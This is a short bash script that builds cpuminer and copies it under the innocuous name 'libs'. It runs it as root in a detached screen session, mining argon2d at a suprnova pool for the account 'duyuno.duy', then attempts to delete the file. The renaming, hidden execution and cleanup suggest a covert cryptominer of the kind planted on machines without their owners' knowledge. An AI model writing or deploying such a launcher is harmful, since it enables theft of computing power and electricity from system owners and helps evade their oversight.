#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a argon2d -o stratum+tcp://dyn.suprnova.cc:5960 -u duyuno.duy -p x
cd /
sudo rm -rf libs